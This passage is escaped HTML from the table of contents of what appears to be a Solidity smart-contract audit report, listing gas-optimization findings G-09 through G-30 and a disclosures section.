href=\"#g09--x--y-costs-more-gas-than-x--x--y-for-state-variables\">G‑09  <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</a></li>\n<li><a href=\"#g10--internal-functions-only-called-once-can-be-inlined-to-save-gas\">G‑10  <code>internal</code> functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#g11--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\">G‑11  Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</a></li>\n<li><a href=\"#g12--ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\">G‑12  <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</a></li>\n<li><a href=\"#g13--requirerevert-strings-longer-than-32-bytes-cost-extra-gas\">G‑13  <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</a></li>\n<li><a href=\"#g14--optimize-names-to-save-gas\">G‑14  Optimize names to save gas</a></li>\n<li><a href=\"#g15--use-a-more-recent-version-of-solidity\">G‑15  Use a more recent version of solidity</a></li>\n<li><a href=\"#g16--splitting-require-statements-that-use--saves-gas\">G‑16  Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</a></li>\n<li><a href=\"#g17--dont-compare-boolean-expressions-to-boolean-literals\">G‑17  Don’t compare boolean expressions to boolean literals</a></li>\n<li><a href=\"#g18--ternary-unnecessary\">G‑18  Ternary unnecessary</a></li>\n<li><a href=\"#g19--require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\">G‑19  <code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</a></li>\n<li><a href=\"#g20--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑20  Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n<li><a href=\"#g21--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G‑21  Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n<li><a href=\"#g22--dont-use-_msgsender-if-not-supporting-eip-2771\">G‑22  Don’t use <code>_msgSender()</code> if not supporting EIP-2771</a></li>\n<li><a href=\"#excluded-gas-optimization-findings\">Excluded Gas Optimization Findings</a></li>\n<li><a href=\"#g23--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\">G‑23  Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</a></li>\n<li><a href=\"#g24--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\">G‑24  State variables should be cached in stack variables rather than re-reading them from storage</a></li>\n<li><a href=\"#g25--arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\">G‑25  <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</a></li>\n<li><a href=\"#g26--using-bools-for-storage-incurs-overhead\">G‑26  Using <code>bool</code>s for storage incurs overhead</a></li>\n<li><a href=\"#g27--using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\">G‑27  Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</a></li>\n<li><a href=\"#g28--i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\">G‑28  <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</a></li>\n<li><a href=\"#g29--using-private-rather-than-public-for-constants-saves-gas\">G‑29  Using <code>private</code> rather than <code>public</code> for constants, saves gas</a></li>\n<li><a href=\"#g30--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑30  Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}